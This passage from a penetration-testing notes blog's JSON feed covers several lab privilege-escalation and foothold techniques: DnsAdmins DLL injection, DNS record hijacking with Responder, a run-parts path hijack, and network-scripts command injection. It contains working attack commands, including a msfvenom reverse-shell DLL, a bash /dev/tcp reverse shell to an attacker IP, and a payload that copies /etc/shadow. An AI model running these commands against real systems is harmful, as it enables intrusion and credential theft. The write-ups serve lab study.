            "summary": "Malicious DLL Injection",
            "content_text": "OverviewIf low privileged user is a member of DnsAdmins, attacker can inject a malicuous DLL in DNS service and achieve privilege escalation.Environment Setup and Requirements  Low privileged user must be a member of DnsAdmins  Low privileged user must be able to start and stop DNS service  Separate attacker windows machine for compiling DLLSteps  Download this DLL DNS plugin and open it in attacker windows machine  Get this reverse shell, update it with your IP/PORT settings, and put it under sources. Ensure to add #include \"stdafx.h\" at the top.  Create this header file  Update the main code. These changes below will create a new thread which help prevent crashing the DNS service.  Change to “Release” and start building  DLL should be generated similar to this path. Transfer it to victim machine.  Open netcat listener on attacker  Inside victim, load the DLL into DNS service and restart DNS to activate it. In this step, we are loading the DLL from attacker share to bypass some AV.# loaddnscmd /config /serverlevelplugindll \\\\10.10.14.31\\share\\Win32Project1.dll# verifydnscmd /config /serverlevelplugindll \\\\10.10.14.31\\share\\Win32Project1.dll# stop dnscmd /c sc stop dns# start dnscmd /c sc start dnsTroubleshooting  For some reason, DLL generated by msfvenom doesn’t work. Seems its crashing the DNS service.msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.31 LPORT=4444 -f dll &gt; evil.dll  If you encounter MFC errors during build, install the MFC libraries from Visual Studio Installer  If you encounter revshell: must return a value, add a return value at the end of rev.cpp// [..redacted...]\tWSACleanup();\treturn 0;}References  HTB Resolute  Escalating Privileges with DNSAdmins Group  From DnsAdmins to SYSTEM to Domain Compromise",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>If low privileged user is a member of <code class=\"language-plaintext highlighter-rouge\">DnsAdmins</code>, attacker can inject a malicuous DLL in DNS service and achieve privilege escalation.</p><h2 id=\"environment-setup-and-requirements\">Environment Setup and Requirements</h2><ul>  <li>Low privileged user must be a member of <code class=\"language-plaintext highlighter-rouge\">DnsAdmins</code></li>  <li>Low privileged user must be able to start and stop DNS service</li>  <li>Separate attacker windows machine for compiling DLL</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Download this <a href=\"https://github.com/dim0x69/dns-exe-persistance\">DLL DNS plugin</a> and open it in attacker windows machine</li>  <li>Get this <a href=\"https://github.com/tudorthe1ntruder/reverse-shell-poc/blob/master/rs.c\">reverse shell</a>, update it with your IP/PORT settings, and put it under sources. Ensure to add <code class=\"language-plaintext highlighter-rouge\">#include \"stdafx.h\"</code> at the top.</li></ul><p><img src=\"/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/95AB122B-C8B0-41F0-952F-B4399E09CA94.png\" alt=\"\" /></p><ul>  <li>Create this header file</li></ul><p><img src=\"/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/7E830899-6043-4556-8937-60E2BAA92DC1.png\" alt=\"\" /></p><ul>  <li>Update the main code. These changes below will create a new thread which help prevent crashing the DNS service.</li></ul><p><img src=\"/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/FD577ECA-AAFC-4644-A205-6CEEB0CD09EA.png\" alt=\"\" /></p><ul>  <li>Change to “Release” and start building</li></ul><p><img src=\"/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/F49524CA-53B0-402B-8A2D-3BC0AFEE46B4.png\" alt=\"\" /></p><ul>  <li>DLL should be generated similar to this path. Transfer it to victim machine.</li></ul><p><img src=\"/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/B5913B2A-E0A5-439D-ACCC-8BEFCAA2D9FE.png\" alt=\"\" /></p><ul>  <li>Open netcat listener on attacker</li>  <li>Inside victim, load the DLL into DNS service and restart DNS to activate it. In this step, we are loading the DLL from attacker share to bypass some AV.</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># load</span><span class=\"w\"></span><span class=\"n\">dnscmd</span><span class=\"w\"> </span><span class=\"nx\">/config</span><span class=\"w\"> </span><span class=\"nx\">/serverlevelplugindll</span><span class=\"w\"> </span><span class=\"nx\">\\\\10.10.14.31\\share\\Win32Project1.dll</span><span class=\"w\"></span><span class=\"c\"># verify</span><span class=\"w\"></span><span class=\"n\">dnscmd</span><span class=\"w\"> </span><span class=\"nx\">/config</span><span class=\"w\"> </span><span class=\"nx\">/serverlevelplugindll</span><span class=\"w\"> </span><span class=\"nx\">\\\\10.10.14.31\\share\\Win32Project1.dll</span><span class=\"w\"></span><span class=\"c\"># stop dns</span><span class=\"w\"></span><span class=\"n\">cmd</span><span class=\"w\"> </span><span class=\"nx\">/c</span><span class=\"w\"> </span><span class=\"nx\">sc</span><span class=\"w\"> </span><span class=\"nx\">stop</span><span class=\"w\"> </span><span class=\"nx\">dns</span><span class=\"w\"></span><span class=\"c\"># start dns</span><span class=\"w\"></span><span class=\"n\">cmd</span><span class=\"w\"> </span><span class=\"nx\">/c</span><span class=\"w\"> </span><span class=\"nx\">sc</span><span class=\"w\"> </span><span class=\"nx\">start</span><span class=\"w\"> </span><span class=\"nx\">dns</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"troubleshooting\">Troubleshooting</h2><ul>  <li>For some reason, DLL generated by msfvenom doesn’t work. Seems its crashing the DNS service.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>msfvenom <span class=\"nt\">-p</span> windows/shell/reverse_tcp <span class=\"nv\">LHOST</span><span class=\"o\">=</span>10.10.14.31 <span class=\"nv\">LPORT</span><span class=\"o\">=</span>4444 <span class=\"nt\">-f</span> dll <span class=\"o\">&gt;</span> evil.dll</code></pre></div></div><ul>  <li>If you encounter MFC errors during build, install the MFC libraries from Visual Studio Installer</li></ul><p><img src=\"/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/91D4854E-486D-411A-9732-E40C0FAACD16.png\" alt=\"\" /></p><ul>  <li>If you encounter <code class=\"language-plaintext highlighter-rouge\">revshell: must return a value</code>, add a return value at the end of <code class=\"language-plaintext highlighter-rouge\">rev.cpp</code></li></ul><div class=\"language-cpp highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// [..redacted...]</span>\t<span class=\"n\">WSACleanup</span><span class=\"p\">();</span>\t<span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"err\">}</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Resolute</li>  <li><a href=\"https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b\">Escalating Privileges with DNSAdmins Group</a></li>  <li><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise#abuse-dns-with-dnscmd\">From DnsAdmins to SYSTEM to Domain Compromise</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/03/01/malicious-dll-injection",
            
            
            
            "tags": ["dns","privesc","windows"],
            
            "date_published": "2022-03-01T00:00:00+08:00",
            "date_modified": "2022-03-01T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/27/insecure-dynamic-dns-updates",
            "title": "Insecure Dynamic DNS Updates",
            "summary": "Insecure Dynamic DNS Updates",
            "content_text": "What is Dynamic DNS Updates?  Improves management of DNS records  For example, a new end device who receives an IP via DHCP can register itself by adding A record into the DNS  More info: Microsoft DocsVulnerabilityAn attacker can replace a record by its own IP which will force clients to connect to it.Steps  Delete record and replace with attacker IP 10.11.40.33➜ nsupdate&gt; server 10.10.23.72&gt; update delete selfservice.windcorp.thm &gt; send&gt; update add selfservice.windcorp.thm 1234 A 10.11.40.33&gt; send&gt; quit  Verify A record points to attacker IP➜  ra2 dig selfservice.windcorp.thm a @thm; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; selfservice.windcorp.thm a @thm;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 57355;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4000;; QUESTION SECTION:;selfservice.windcorp.thm.\tIN\tA;; ANSWER SECTION:selfservice.windcorp.thm. 1234\tIN\tA\t10.11.40.33;; Query time: 188 msec;; SERVER: 10.10.23.72#53(10.10.23.72);; WHEN: Sat Sep 18 08:00:02 EDT 2021;; MSG SIZE  rcvd: 69  If you have HTTPS certificates looted from victim, put it in respondersudo cp *pem /usr/share/responder/certs/  Point responder config to the certs➜  scans cat /etc/responder/Responder.conf| grep certSSLCert = certs/crt.pemSSLKey = certs/key.pem➜  scans   Fire up responder and wait for clients to connect to yousudo responder -I tun0",
            "content_html": "<h2 id=\"what-is-dynamic-dns-updates\">What is Dynamic DNS Updates?</h2><ul>  <li>Improves management of DNS records</li>  <li>For example, a new end device who receives an IP via DHCP can register itself by adding A record into the DNS</li>  <li>More info: <a href=\"https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/configure-dns-dynamic-updates-windows-server-2003\">Microsoft Docs</a></li></ul><p><img src=\"/spindel/assets/Insecure%20Dynamic%20DNS%20Updates/secure-dns.png\" alt=\"\" /></p><h2 id=\"vulnerability\">Vulnerability</h2><p>An attacker can replace a record by its own IP which will force clients to connect to it.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Delete record and replace with attacker IP <code class=\"language-plaintext highlighter-rouge\">10.11.40.33</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜ nsupdate<span class=\"o\">&gt;</span> server 10.10.23.72<span class=\"o\">&gt;</span> update delete selfservice.windcorp.thm <span class=\"o\">&gt;</span> send<span class=\"o\">&gt;</span> update add selfservice.windcorp.thm 1234 A 10.11.40.33<span class=\"o\">&gt;</span> send<span class=\"o\">&gt;</span> quit</code></pre></div></div><ul>  <li>Verify A record points to attacker IP</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  ra2 dig selfservice.windcorp.thm a @thm<span class=\"p\">;</span> &lt;&lt;<span class=\"o\">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class=\"o\">&gt;&gt;</span> selfservice.windcorp.thm a @thm<span class=\"p\">;;</span> global options: +cmd<span class=\"p\">;;</span> Got answer:<span class=\"p\">;;</span> -&gt;&gt;HEADER<span class=\"o\">&lt;&lt;-</span> <span class=\"no\">opcode</span><span class=\"sh\">: QUERY, status: NOERROR, id: 57355;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4000;; QUESTION SECTION:;selfservice.windcorp.thm.\tIN\tA;; ANSWER SECTION:selfservice.windcorp.thm. 1234\tIN\tA\t10.11.40.33;; Query time: 188 msec;; SERVER: 10.10.23.72#53(10.10.23.72);; WHEN: Sat Sep 18 08:00:02 EDT 2021;; MSG SIZE  rcvd: 69</span></code></pre></div></div><ul>  <li>If you have HTTPS certificates looted from victim, put it in responder</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo cp</span> <span class=\"k\">*</span>pem /usr/share/responder/certs/</code></pre></div></div><ul>  <li>Point responder config to the certs</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  scans <span class=\"nb\">cat</span> /etc/responder/Responder.conf| <span class=\"nb\">grep </span>certSSLCert <span class=\"o\">=</span> certs/crt.pemSSLKey <span class=\"o\">=</span> certs/key.pem➜  scans </code></pre></div></div><ul>  <li>Fire up responder and wait for clients to connect to you</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo </span>responder <span class=\"nt\">-I</span> tun0</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/02/27/insecure-dynamic-dns-updates",
            
            
            
            "tags": ["dns","windows","foothold"],
            
            "date_published": "2022-02-27T00:00:00+08:00",
            "date_modified": "2022-02-27T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/25/gitlab",
            "title": "Gitlab",
            "summary": "Gitlab",
            "content_text": "Credentialsroot:&lt;random token set during installation&gt;Finding version  Log in &gt; helpInteresting Files and Directories# contains private key/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml# contains root password#   gitlab_rails['initial_root_password'] = '&lt;my_strong_password&gt;'/etc/gitlab/gitlab.rbcat /etc/gitlab/gitlab.rb | grep git_data_dirs# - Contains repositories from other users# - Looks like only contains bare repos, no actual files/var/opt/gitlab/git-data/repositories# You can find clues here about private or hidden reposgrep -r securedocker /var/log/gitlab 2&gt; /dev/nullCommands# gitlab console - can be used for management such as password#                  resets# https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.htmlgitlab-rails console# Mirroring an exposed .git directory and recreating the fileswget --mirror -I .git 10.10.10.70/.gitgit checkout -- .Other Enumeration Methods  Check public projects  Check users  Check activities  Look for private projectsSignup  There might be whitelisted domains on emails you can use  Try to use the domain of the boxReferences  Pentesting Git source repositories",
            "content_html": "<h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>root:&lt;random token <span class=\"nb\">set </span>during installation&gt;</code></pre></div></div><h2 id=\"finding-version\">Finding version</h2><ul>  <li>Log in &gt; help</li></ul><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># contains private key</span>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml<span class=\"c\"># contains root password</span><span class=\"c\">#   gitlab_rails['initial_root_password'] = '&lt;my_strong_password&gt;'</span>/etc/gitlab/gitlab.rb<span class=\"nb\">cat</span> /etc/gitlab/gitlab.rb | <span class=\"nb\">grep </span>git_data_dirs<span class=\"c\"># - Contains repositories from other users</span><span class=\"c\"># - Looks like only contains bare repos, no actual files</span>/var/opt/gitlab/git-data/repositories<span class=\"c\"># You can find clues here about private or hidden repos</span><span class=\"nb\">grep</span> <span class=\"nt\">-r</span> securedocker /var/log/gitlab 2&gt; /dev/null</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># gitlab console - can be used for management such as password</span><span class=\"c\">#                  resets</span><span class=\"c\"># https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html</span>gitlab-rails console<span class=\"c\"># Mirroring an exposed .git directory and recreating the files</span>wget <span class=\"nt\">--mirror</span> <span class=\"nt\">-I</span> .git 10.10.10.70/.gitgit checkout <span class=\"nt\">--</span> <span class=\"nb\">.</span></code></pre></div></div><h2 id=\"other-enumeration-methods\">Other Enumeration Methods</h2><ul>  <li>Check public projects</li>  <li>Check users</li>  <li>Check activities</li>  <li>Look for private projects</li></ul><h2 id=\"signup\">Signup</h2><ul>  <li>There might be whitelisted domains on emails you can use</li>  <li>Try to use the domain of the box</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.errno.fr/Attacking_source_repositories.html\">Pentesting Git source repositories</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/25/gitlab",
            
            
            
            "tags": ["git","enum"],
            
            "date_published": "2022-02-25T00:00:00+08:00",
            "date_modified": "2022-02-25T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/23/ssh-run-parts",
            "title": "SSH run-parts",
            "summary": "SSH run-parts",
            "content_text": "Overviewrun-parts is being run by root whenever a successful ssh login completes. Attacker can crafyt a malicious run-parts binary if he can override system paths such as /usr/local/sbin.This is a type of path injection attack.Steps  Ensure you have write permission to /usr/local/sbin  Use pspy  to monitor the process inside victim machine. Open another terminal and SSH to victim again.$ ./pspy -f[...redacted...]2021/11/05 23:59:17 CMD: UID=0    PID=2090   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new [...redacted...]# 2 things to notice:#  - run-parts is not using full path#  - it is running as UID=0 which is root  Craft malicuous binaryecho '#!/bin/bash' &gt; /usr/local/sbin/run-partsecho 'cp /etc/shadow /tmp; chmod +r /tmp/shadow' &gt; /usr/local/sbin/run-parts  Try SSH login again. You should be able to read now the shadow file.Some takewaysEven on modern linux systems, run-parts still have this behaviour. As an example, here is what I saw from my kali machine.➜  linux cat /etc/crontab | grep run-parts17 *\t* * *\troot    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )➜  linux",
            "content_html": "<h2 id=\"overview\">Overview</h2><p><code class=\"language-plaintext highlighter-rouge\">run-parts</code> is being run by root whenever a successful ssh login completes. Attacker can crafyt a malicious <code class=\"language-plaintext highlighter-rouge\">run-parts</code> binary if he can override system paths such as <code class=\"language-plaintext highlighter-rouge\">/usr/local/sbin</code>.</p><p>This is a type of path injection attack.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Ensure you have write permission to <code class=\"language-plaintext highlighter-rouge\">/usr/local/sbin</code></li>  <li>Use <code class=\"language-plaintext highlighter-rouge\">pspy</code>  to monitor the process inside victim machine. Open another terminal and SSH to victim again.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>./pspy <span class=\"nt\">-f</span><span class=\"o\">[</span>...redacted...]2021/11/05 23:59:17 CMD: <span class=\"nv\">UID</span><span class=\"o\">=</span>0    <span class=\"nv\">PID</span><span class=\"o\">=</span>2090   | sh <span class=\"nt\">-c</span> /usr/bin/env <span class=\"nt\">-i</span> <span class=\"nv\">PATH</span><span class=\"o\">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts <span class=\"nt\">--lsbsysinit</span> /etc/update-motd.d <span class=\"o\">&gt;</span> /run/motd.dynamic.new <span class=\"o\">[</span>...redacted...]<span class=\"c\"># 2 things to notice:</span><span class=\"c\">#  - run-parts is not using full path</span><span class=\"c\">#  - it is running as UID=0 which is root</span></code></pre></div></div><ul>  <li>Craft malicuous binary</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"s1\">'#!/bin/bash'</span> <span class=\"o\">&gt;</span> /usr/local/sbin/run-parts<span class=\"nb\">echo</span> <span class=\"s1\">'cp /etc/shadow /tmp; chmod +r /tmp/shadow'</span> <span class=\"o\">&gt;</span> /usr/local/sbin/run-parts</code></pre></div></div><ul>  <li>Try SSH login again. You should be able to read now the shadow file.</li></ul><h2 id=\"some-takeways\">Some takeways</h2><p>Even on modern linux systems, <code class=\"language-plaintext highlighter-rouge\">run-parts</code> still have this behaviour. As an example, here is what I saw from my kali machine.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  linux <span class=\"nb\">cat</span> /etc/crontab | <span class=\"nb\">grep </span>run-parts17 <span class=\"k\">*</span>\t<span class=\"k\">*</span> <span class=\"k\">*</span> <span class=\"k\">*</span>\troot    <span class=\"nb\">cd</span> / <span class=\"o\">&amp;&amp;</span> run-parts <span class=\"nt\">--report</span> /etc/cron.hourly25 6\t<span class=\"k\">*</span> <span class=\"k\">*</span> <span class=\"k\">*</span>\troot\t<span class=\"nb\">test</span> <span class=\"nt\">-x</span> /usr/sbin/anacron <span class=\"o\">||</span> <span class=\"o\">(</span> <span class=\"nb\">cd</span> / <span class=\"o\">&amp;&amp;</span> run-parts <span class=\"nt\">--report</span> /etc/cron.daily <span class=\"o\">)</span>47 6\t<span class=\"k\">*</span> <span class=\"k\">*</span> 7\troot\t<span class=\"nb\">test</span> <span class=\"nt\">-x</span> /usr/sbin/anacron <span class=\"o\">||</span> <span class=\"o\">(</span> <span class=\"nb\">cd</span> / <span class=\"o\">&amp;&amp;</span> run-parts <span class=\"nt\">--report</span> /etc/cron.weekly <span class=\"o\">)</span>52 6\t1 <span class=\"k\">*</span> <span class=\"k\">*</span>\troot\t<span class=\"nb\">test</span> <span class=\"nt\">-x</span> /usr/sbin/anacron <span class=\"o\">||</span> <span class=\"o\">(</span> <span class=\"nb\">cd</span> / <span class=\"o\">&amp;&amp;</span> run-parts <span class=\"nt\">--report</span> /etc/cron.monthly <span class=\"o\">)</span>➜  linux</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/02/23/ssh-run-parts",
            
            
            
            "tags": ["linux","privesc"],
            
            "date_published": "2022-02-23T00:00:00+08:00",
            "date_modified": "2022-02-23T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/22/network-scripts-command-injection",
            "title": "Network Scripts Command Injection",
            "summary": "Network Scripts Command Injection",
            "content_text": "OverviewAttacker can do privesc if user has sudo permissions to create or modify ifcfg-&lt;DEVICE_NAME&gt; under /etc/sysconfig/network-scriptsEnvironment Setup and Requirements  Sudo permissionsUser guly may run the following commands on networked:    (root) NOPASSWD: /usr/local/sbin/changename.sh  Script content#!/bin/bash -pcat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoFDEVICE=guly0ONBOOT=noNM_CONTROLLED=noEoFregexp=\"^[a-zA-Z0-9_\\ /-]+$\"for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do\techo \"interface $var:\"\tread x\twhile [[ ! $x =~ $regexp ]]; do\t\techo \"wrong input, try again\"\t\techo \"interface $var:\"\t\tread x\tdone\techo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-gulydone  /sbin/ifup guly0Steps  Create your malicuous scriptecho 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1' &gt; /home/guly/evil  Open netcat listener on attacker machine  Run script using sudo and enjoy[guly@networked ~]$ sudo /usr/local/sbin/changename.shinterface NAME:guly0 /home/guly/evil[...redacted...]References  Linux Privilege Escalation - HackTricks  HackTheBox - Networked",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can do privesc if user has sudo permissions to create or modify <code class=\"language-plaintext highlighter-rouge\">ifcfg-&lt;DEVICE_NAME&gt;</code> under <code class=\"language-plaintext highlighter-rouge\">/etc/sysconfig/network-scripts</code></p><h2 id=\"environment-setup-and-requirements\">Environment Setup and Requirements</h2><ul>  <li>Sudo permissions</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>User guly may run the following commands on networked:    (root) NOPASSWD: /usr/local/sbin/changename.sh</code></pre></div></div><ul>  <li>Script content</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">#!/bin/bash -p</span><span class=\"nb\">cat</span> <span class=\"o\">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class=\"o\">&lt;&lt;</span> <span class=\"no\">EoF</span><span class=\"sh\">DEVICE=guly0ONBOOT=noNM_CONTROLLED=no</span><span class=\"no\">EoF</span><span class=\"nv\">regexp</span><span class=\"o\">=</span><span class=\"s2\">\"^[a-zA-Z0-9_</span><span class=\"se\">\\ </span><span class=\"s2\">/-]+$\"</span><span class=\"k\">for </span>var <span class=\"k\">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class=\"p\">;</span> <span class=\"k\">do\t</span><span class=\"nb\">echo</span> <span class=\"s2\">\"interface </span><span class=\"nv\">$var</span><span class=\"s2\">:\"</span>\t<span class=\"nb\">read </span>x\t<span class=\"k\">while</span> <span class=\"o\">[[</span> <span class=\"o\">!</span> <span class=\"nv\">$x</span> <span class=\"o\">=</span>~ <span class=\"nv\">$regexp</span> <span class=\"o\">]]</span><span class=\"p\">;</span> <span class=\"k\">do\t\t</span><span class=\"nb\">echo</span> <span class=\"s2\">\"wrong input, try again\"</span>\t\t<span class=\"nb\">echo</span> <span class=\"s2\">\"interface </span><span class=\"nv\">$var</span><span class=\"s2\">:\"</span>\t\t<span class=\"nb\">read </span>x\t<span class=\"k\">done\t</span><span class=\"nb\">echo</span> <span class=\"nv\">$var</span><span class=\"o\">=</span><span class=\"nv\">$x</span> <span class=\"o\">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly<span class=\"k\">done</span>  /sbin/ifup guly0</code></pre></div></div><h2 id=\"steps\">Steps</h2><ul>  <li>Create your malicuous script</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"s1\">'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1'</span> <span class=\"o\">&gt;</span> /home/guly/evil</code></pre></div></div><ul>  <li>Open netcat listener on attacker machine</li>  <li>Run script using sudo and enjoy</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">[</span>guly@networked ~]<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> /usr/local/sbin/changename.shinterface NAME:guly0 /home/guly/evil<span class=\"o\">[</span>...redacted...]</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-sysconfig-network-scripts-centos-redhat\">Linux Privilege Escalation - HackTricks</a></li>  <li><a href=\"https://www.youtube.com/watch?v=H3t3G70bakM\">HackTheBox - Networked</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/22/network-scripts-command-injection",
            
            
            
            "tags": ["linux","privesc","networking"],
            
            "date_published": "2022-02-22T00:00:00+08:00",
            "date_modified": "2022-02-22T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/19/october-cms",
            "title": "October CMS",
            "summary": "October CMS",
            "content_text": "Credentials# defaultadmin:admin# othersoctober:passwdVersion Detection  Doesn’t discloseInteresting URL Paths# admin portal/backend/backend/auth/signin# media uploads directory - you can put reverse shell here/storage/app/media/Interesting Files and Directories# credentialsconfig/database.phpCredentials  You can register user without email verificationPlugins# account managementRainLab.UserSome Exploits and Vulnerabilities  File upload - bypass by using .php5 extensionReferences  HTB October",
            "content_html": "<h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># default</span>admin:admin<span class=\"c\"># others</span>october:passwd</code></pre></div></div><h2 id=\"version-detection\">Version Detection</h2><ul>  <li>Doesn’t disclose</li></ul><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># admin portal</span>/backend/backend/auth/signin<span class=\"c\"># media uploads directory - you can put reverse shell here</span>/storage/app/media/</code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># credentials</span>config/database.php</code></pre></div></div><h2 id=\"credentials-1\">Credentials</h2><ul>  <li>You can register user without email verification</li></ul><h2 id=\"plugins\">Plugins</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># account management</span>RainLab.User</code></pre></div></div><h2 id=\"some-exploits-and-vulnerabilities\">Some Exploits and Vulnerabilities</h2><ul>  <li>File upload - bypass by using <code class=\"language-plaintext highlighter-rouge\">.php5</code> extension</li></ul><h2 id=\"references\">References</h2><ul>  <li>HTB October</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/19/october-cms",
            
            
            
            "tags": ["php","enum","cms"],
            
            "date_published": "2022-02-19T00:00:00+08:00",
            "date_modified": "2022-02-19T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/18/extracting-creds-from-ad-connect",
            "title": "Extracting creds from AD Connect",
            "summary": "Extracting creds from AD Connect",
            "content_text": "OverviewAttacker can extract admin credentials from ADSync databases that is used for syncing credential hashes from onpremis AD to Azure AD.Enviroment Setup and Requirements  AD sync must be running on victim machine using “Password Hash Synchronisation (PHS)”  Low privileged user must have permission on ADSync DB  Attacker must have gained access to that low privileged account via winrmSteps  Login to victim via winrm  Check if AD Sync is runningGet-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync  Verify access to ADSync DB*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; sqlcmd /S localhost /d ADSync /q \"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\"keyset_id   instance_id                          entropy----------- ------------------------------------ ------------------------------------          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD(1 rows affected)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt;   Run this powershell script. This will get the encrypted string from mms_management_agent table and 